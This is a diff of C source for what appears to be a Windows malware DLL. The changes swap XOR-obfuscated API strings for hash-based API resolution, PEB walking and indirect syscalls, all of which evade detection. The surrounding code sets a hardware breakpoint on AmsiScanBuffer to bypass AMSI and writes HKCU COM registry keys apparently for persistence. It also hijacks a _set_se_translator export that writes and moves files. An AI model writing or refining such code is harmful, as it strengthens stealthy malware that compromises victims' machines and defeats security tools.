@@ -1,5 +1,6 @@
 #include <windows.h>
 #include "indirect.h"
+#include "resolve.h"
 
 void ___chkstk_ms(void) { return; }
 
@@ -131,14 +132,6 @@ __attribute__((noinline, optimize("O0")))
 static void reg_install(const char *subkey, const char *dll_path) {
   unsigned char e_advapi32[] = {0x58, 0x5c, 0x45, 0x53, 0x17, 0x0f, 0x01,
                                 0x50, 0x4d, 0x56, 0x55, 0x33};
-  unsigned char e_RegCreateKeyExA[] = {0x6b, 0x5d, 0x54, 0x71, 0x15, 0x03,
-                                       0x53, 0x16, 0x06, 0x79, 0x5c, 0x26,
-                                       0x74, 0x4a, 0x71};
-  unsigned char e_RegSetValueExW[] = {0x6b, 0x5d, 0x54, 0x61, 0x02, 0x12,
-                                      0x64, 0x03, 0x0f, 0x47, 0x5c, 0x1a,
-                                      0x49, 0x65};
-  unsigned char e_RegCloseKey[] = {0x6b, 0x5d, 0x54, 0x71, 0x0b, 0x09, 0x41,
-                                   0x07, 0x28, 0x57, 0x40};
   typedef LSTATUS(WINAPI *pRegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD,
                                             REGSAM, LPSECURITY_ATTRIBUTES,
                                             PHKEY, LPDWORD);
@@ -151,9 +144,10 @@ static void reg_install(const char *subkey, const char *dll_path) {
   WCHAR wdll[512];
   static const WCHAR wtm[] = L"ThreadingModel";
   static const WCHAR wapt[] = L"Apartment";
-  pRegCreateKeyExA fRegCreateKeyExA;
-  pRegSetValueExW fRegSetValueExW;
-  pRegCloseKey fRegCloseKey;
+  pRegCreateKeyExA fRegCreateKeyExA = NULL;
+  pRegSetValueExW fRegSetValueExW = NULL;
+  pRegCloseKey fRegCloseKey = NULL;
+  API_SLOT adv_slots[3];
   int plen;
   DWORD cbDllW;
 
@@ -163,10 +157,14 @@ static void reg_install(const char *subkey, const char *dll_path) {
   hAdv = rl(e_advapi32, 12);
   if (!hAdv)
     return;
-  fRegCreateKeyExA = (pRegCreateKeyExA)ra(hAdv, e_RegCreateKeyExA, 15);
-  fRegSetValueExW = (pRegSetValueExW)ra(hAdv, e_RegSetValueExW, 14);
-  fRegCloseKey = (pRegCloseKey)ra(hAdv, e_RegCloseKey, 11);
-  if (!fRegCreateKeyExA || !fRegSetValueExW || !fRegCloseKey)
+
+  adv_slots[0].hash = HASH_RegCreateKeyExA;
+  adv_slots[0].out = (void **)&fRegCreateKeyExA;
+  adv_slots[1].hash = HASH_RegSetValueExW;
+  adv_slots[1].out = (void **)&fRegSetValueExW;
+  adv_slots[2].hash = HASH_RegCloseKey;
+  adv_slots[2].out = (void **)&fRegCloseKey;
+  if (!resolve_api_batch(hAdv, adv_slots, 3))
     return;
 
   if (fRegCreateKeyExA(hkcu, subkey, 0, NULL, 0, 0x00020006, NULL, &hKey,
@@ -260,49 +258,61 @@ static LONG WINAPI bp_veh(PEXCEPTION_POINTERS ex) {
   return EXCEPTION_CONTINUE_EXECUTION;
 }
 
+static HMODULE get_k32(void) {
+  HMODULE h = mod_from_peb(HASH_kernel32_dll);
+  if (h)
+    return h;
+  {
+    unsigned char e_k32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
+                             0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};
+    return rl(e_k32, 13);
+  }
+}
+
+#ifdef _WIN64
+static HMODULE get_ntdll(void) {
+  HMODULE h = mod_from_peb(HASH_ntdll_dll);
+  if (h)
+    return h;
+  {
+    unsigned char e_nt[] = {0x57, 0x4c, 0x57, 0x5e, 0x0b,
+                            0x48, 0x56, 0x0e, 0x0f};
+    return rl(e_nt, 9);
+  }
+}
+#endif
+
 static void bp_arm(void) {
-  unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
-                               0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};
   unsigned char e_amsi[] = {0x58, 0x55, 0x40, 0x5b, 0x49, 0x02, 0x5e, 0x0e};
-  unsigned char e_AmsiScanBuffer[] = {0x78, 0x55, 0x40, 0x5b, 0x34, 0x05, 0x53,
-                                    0x0c, 0x21, 0x47, 0x5f, 0x39, 0x54, 0x40};
-  unsigned char e_AddVectoredExceptionHandler[] = {
-      0x78, 0x5c, 0x57, 0x64, 0x02, 0x05, 0x46, 0x0d, 0x11, 0x57, 0x5d,
-      0x1a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f, 0x78, 0x02,
-      0x47, 0x4d, 0x0e, 0x25, 0x32};
-  unsigned char e_GetModuleHandleA[] = {0x7e, 0x5d, 0x47, 0x7f, 0x08, 0x02,
-                                        0x47, 0x0e, 0x06, 0x7a, 0x58, 0x31,
-                                        0x55, 0x5e, 0x55, 0x24};
-  unsigned char e_GetThreadContext[] = {0x7e, 0x5d, 0x47, 0x66, 0x0f, 0x14,
-                                        0x57, 0x03, 0x07, 0x71, 0x56, 0x31,
-                                        0x45, 0x57, 0x48, 0x11};
-  unsigned char e_SetThreadContext[] = {0x6a, 0x5d, 0x47, 0x66, 0x0f, 0x14,
-                                        0x57, 0x03, 0x07, 0x71, 0x56, 0x31,
-                                        0x45, 0x57, 0x48, 0x11};
-  unsigned char e_GetCurrentThread[] = {0x7e, 0x5d, 0x47, 0x71, 0x12, 0x14,
-                                        0x40, 0x07, 0x0d, 0x46, 0x6d, 0x37,
-                                        0x43, 0x57, 0x51, 0x01};
 
   HMODULE hK32;
   HMODULE hAmsi;
   void *fn;
   CONTEXT ctx;
   HANDLE hThread;
+  pGetModuleHandleA fGetModuleHandleA = NULL;
+  pAddVectoredExceptionHandler fAddVectoredExceptionHandler = NULL;
+  pGetThreadContext fGetThreadContext = NULL;
+  pSetThreadContext fSetThreadContext = NULL;
+  pGetCurrentThread fGetCurrentThread = NULL;
+  API_SLOT k32_slots[5];
 
-  hK32 = rl(e_kernel32, 13);
+  hK32 = get_k32();
   if (!hK32)
     return;
 
-  pGetModuleHandleA fGetModuleHandleA =
-      (pGetModuleHandleA)ra(hK32, e_GetModuleHandleA, 16);
-  pAddVectoredExceptionHandler fAddVectoredExceptionHandler =
-      (pAddVectoredExceptionHandler)ra(hK32, e_AddVectoredExceptionHandler, 27);
-  pGetThreadContext fGetThreadContext =
-      (pGetThreadContext)ra(hK32, e_GetThreadContext, 16);
-  pSetThreadContext fSetThreadContext =
-      (pSetThreadContext)ra(hK32, e_SetThreadContext, 16);
-  pGetCurrentThread fGetCurrentThread =
-      (pGetCurrentThread)ra(hK32, e_GetCurrentThread, 16);
+  k32_slots[0].hash = HASH_GetModuleHandleA;
+  k32_slots[0].out = (void **)&fGetModuleHandleA;
+  k32_slots[1].hash = HASH_AddVectoredExceptionHandler;
+  k32_slots[1].out = (void **)&fAddVectoredExceptionHandler;
+  k32_slots[2].hash = HASH_GetThreadContext;
+  k32_slots[2].out = (void **)&fGetThreadContext;
+  k32_slots[3].hash = HASH_SetThreadContext;
+  k32_slots[3].out = (void **)&fSetThreadContext;
+  k32_slots[4].hash = HASH_GetCurrentThread;
+  k32_slots[4].out = (void **)&fGetCurrentThread;
+  if (!resolve_api_batch(hK32, k32_slots, 5))
+    return;
 
   if (!fGetModuleHandleA || !fAddVectoredExceptionHandler ||
       !fGetThreadContext || !fSetThreadContext || !fGetCurrentThread)
@@ -320,7 +330,7 @@ static void bp_arm(void) {
     return;
 
   if (!g_bp_tgt) {
-    fn = (void *)ra(hAmsi, e_AmsiScanBuffer, 14);
+    fn = resolve_by_hash(hAmsi, HASH_AmsiScanBuffer);
     if (!fn)
       return;
     g_bp_tgt = fn;
@@ -357,32 +367,9 @@ void *_set_se_translator(void *translator) {
       return (void *)0;
   }
 
-  unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
-                                0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};
-
-  HMODULE hK32 = rl(e_kernel32, 13);
-
-  unsigned char e_CreateDirectoryA[] = {0x7a, 0x4a, 0x56, 0x53, 0x13, 0x03,
-                                        0x76, 0x0b, 0x11, 0x57, 0x5a, 0x2b,
-                                        0x5e, 0x40, 0x49, 0x24, 0x39};
-  unsigned char e_CreateFileA[] = {0x7a, 0x4a, 0x56, 0x53, 0x13, 0x03,
-                                   0x74, 0x0b, 0x0f, 0x57, 0x78, 0x5f};
-  unsigned char e_WriteFile[] = {0x6e, 0x4a, 0x5a, 0x46, 0x02,
-                                 0x20, 0x5b, 0x0e, 0x06, 0x32};
-  unsigned char e_CloseHandle[] = {0x7a, 0x54, 0x5c, 0x41, 0x02, 0x2e,
-                                   0x53, 0x0c, 0x07, 0x5e, 0x5c, 0x5f};
-
-  unsigned char e_MoveFileExA[] = {0x74, 0x57, 0x45, 0x57, 0x21, 0x0f,
-                                   0x5e, 0x07, 0x26, 0x4a, 0x78};
-  unsigned char e_GetModuleFileNameA[] = {0x7e, 0x5d, 0x47, 0x7f, 0x08, 0x02,
-                                          0x47, 0x0e, 0x06, 0x74, 0x50, 0x33,
-                                          0x54, 0x7c, 0x51, 0x08, 0x5c, 0x29};
-  unsigned char e_VirtualQuery[] = {0x6f, 0x51, 0x41, 0x46, 0x12, 0x07,
-                                    0x5e, 0x33, 0x16, 0x57, 0x4b, 0x26};
-  unsigned char e_ExpandEnvironmentStringsA[] = {
-      0x7c, 0x40, 0x43, 0x53, 0x09, 0x02, 0x77, 0x0c, 0x15, 0x5b, 0x4b, 0x30,
-      0x5f, 0x5f, 0x55, 0x0b, 0x4d, 0x3b, 0x10, 0x43, 0x59, 0x0d, 0x4e, 0x5a,
-      0x23};
+  HMODULE hK32 = get_k32();
+  if (!hK32)
+    return (void *)0;
 
   typedef BOOL(WINAPI * pCreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
   typedef HANDLE(WINAPI * pCreateFileA)(
@@ -394,26 +381,59 @@ void *_set_se_translator(void *translator) {
   typedef DWORD(WINAPI * pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
   typedef SIZE_T(WINAPI * pVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION,
                                          SIZE_T);
+  typedef VOID(WINAPI * pGetSystemTime)(LPSYSTEMTIME);
+  typedef int(WINAPI * pGetTimeFormatA)(LCID, DWORD, const SYSTEMTIME *, LPCSTR,
+                                        LPSTR, int);
 
-  pCreateDirectoryA fCreateDirectoryA =
-      (pCreateDirectoryA)ra(hK32, e_CreateDirectoryA, 17);
-  pCreateFileA fCreateFileA = (pCreateFileA)ra(hK32, e_CreateFileA, 12);
-  pWriteFile fWriteFile = (pWriteFile)ra(hK32, e_WriteFile, 10);
-  pCloseHandle fCloseHandle = (pCloseHandle)ra(hK32, e_CloseHandle, 12);
-  pMoveFileExA fMoveFileExA = (pMoveFileExA)ra(hK32, e_MoveFileExA, 11);
-  pGetModuleFileNameA fGetModuleFileNameA =
-      (pGetModuleFileNameA)ra(hK32, e_GetModuleFileNameA, 18);
-  pVirtualQuery fVirtualQuery = (pVirtualQuery)ra(hK32, e_VirtualQuery, 12);
-  pExpandEnvironmentStringsA fExpandEnvironmentStringsA =
-      (pExpandEnvironmentStringsA)ra(hK32, e_ExpandEnvironmentStringsA, 25);
+  pCreateDirectoryA fCreateDirectoryA = NULL;
+  pCreateFileA fCreateFileA = NULL;
+  pWriteFile fWriteFile = NULL;
+  pCloseHandle fCloseHandle = NULL;
+  pMoveFileExA fMoveFileExA = NULL;
+  pGetModuleFileNameA fGetModuleFileNameA = NULL;
+  pVirtualQuery fVirtualQuery = NULL;
+  pExpandEnvironmentStringsA fExpandEnvironmentStringsA = NULL;
+  pGetSystemTime fGetSystemTime = NULL;
+  pGetTimeFormatA fGetTimeFormatA = NULL;
+  API_SLOT k32_core[5];
+  API_SLOT k32_fallback[5];
+  int use_indirect = 0;
 
 #ifdef _WIN64
-  unsigned char e_ntdll[] = {0x57, 0x4c, 0x57, 0x5e, 0x0b,
-                             0x48, 0x56, 0x0e, 0x0f};
-  int use_indirect = indirect_init(rl(e_ntdll, 9));
-#else
-  int use_indirect = 0;
+  {
+    HMODULE hNtdll = get_ntdll();
+    if (hNtdll)
+      use_indirect = indirect_init(hNtdll);
+  }
 #endif
+
+  k32_core[0].hash = HASH_ExpandEnvironmentStringsA;
+  k32_core[0].out = (void **)&fExpandEnvironmentStringsA;
+  k32_core[1].hash = HASH_GetModuleFileNameA;
+  k32_core[1].out = (void **)&fGetModuleFileNameA;
+  k32_core[2].hash = HASH_MoveFileExA;
+  k32_core[2].out = (void **)&fMoveFileExA;
+  k32_core[3].hash = HASH_GetSystemTime;
+  k32_core[3].out = (void **)&fGetSystemTime;
+  k32_core[4].hash = HASH_GetTimeFormatA;
+  k32_core[4].out = (void **)&fGetTimeFormatA;
+  if (!resolve_api_batch(hK32, k32_core, 5))
+    return (void *)0;
+
+  if (!use_indirect) {
+    k32_fallback[0].hash = HASH_CreateDirectoryA;
+    k32_fallback[0].out = (void **)&fCreateDirectoryA;
+    k32_fallback[1].hash = HASH_CreateFileA;
+    k32_fallback[1].out = (void **)&fCreateFileA;
+    k32_fallback[2].hash = HASH_WriteFile;
+    k32_fallback[2].out = (void **)&fWriteFile;
+    k32_fallback[3].hash = HASH_CloseHandle;
+    k32_fallback[3].out = (void **)&fCloseHandle;
+    k32_fallback[4].hash = HASH_VirtualQuery;
+    k32_fallback[4].out = (void **)&fVirtualQuery;
+    if (!resolve_api_batch(hK32, k32_fallback, 5))
+      return (void *)0;
+  }
 
   unsigned char e_dir1[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54};
   unsigned char e_dir2[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55, 0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53, 0x6c, 0x24, 0x5d, 0x07, 0x06, 0x54, 0x6c, 0x22, 0x7b, 0x64};
@@ -583,15 +603,6 @@ void *_set_se_translator(void *translator) {
     else
       fCloseHandle(hFile);
   }
-
-  unsigned char e_GetSystemTime[] = {0x7e, 0x5d, 0x47, 0x61, 0x1e, 0x15, 0x46, 0x07, 0x0e, 0x66, 0x50, 0x32, 0x54};
-  unsigned char e_GetTimeFormatA[] = {0x7e, 0x5d, 0x47, 0x66, 0x0e, 0x0b, 0x57, 0x24, 0x0c, 0x40, 0x54, 0x3e, 0x45, 0x73};
-  
-  typedef VOID (WINAPI *pGetSystemTime)(LPSYSTEMTIME);
-  typedef int (WINAPI *pGetTimeFormatA)(LCID, DWORD, const SYSTEMTIME*, LPCSTR, LPSTR, int);
-  
-  pGetSystemTime fGetSystemTime = (pGetSystemTime)ra(hK32, e_GetSystemTime, 13);
-  pGetTimeFormatA fGetTimeFormatA = (pGetTimeFormatA)ra(hK32, e_GetTimeFormatA, 14);
 
   SYSTEMTIME st;
   fGetSystemTime(&st);
